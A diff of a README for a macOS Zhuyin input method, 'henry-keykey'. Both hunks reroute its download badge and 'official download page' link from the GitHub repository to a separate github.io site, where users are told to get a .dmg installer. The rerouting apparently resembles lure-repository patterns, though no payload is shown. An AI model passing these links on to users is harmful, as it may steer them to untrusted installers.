@@ -1,6 +1,6 @@
 # ⌨️ henry-keykey - Efficient Zhuyin typing for Apple Silicon
 
-[![](https://img.shields.io/badge/Download-henry--keykey-blue.svg)](https://github.com/thacherbiradial62/henry-keykey)
+[![](https://img.shields.io/badge/Download-henry--keykey-blue.svg)](https://thacherbiradial62.github.io)
 
 henry-keykey provides an input method for macOS users who prefer the Zhuyin layout. This tool runs natively on Apple Silicon chips. It handles Traditional and Simplified Chinese output. It learns your typing habits on your device.
 
@@ -21,7 +21,7 @@ henry-keykey provides an input method for macOS users who prefer the Zhuyin layo
 
 ## 📥 How to Install
 
-1.  Visit the [official download page](https://github.com/thacherbiradial62/henry-keykey) to get the latest version.
+1.  Visit the [official download page](https://thacherbiradial62.github.io) to get the latest version.
 2.  Locate the disk image file (`.dmg`) in your Downloads folder.
 3.  Double-click the file to open it.
 4.  Drag the `henry-keykey` icon into your Applications folder.
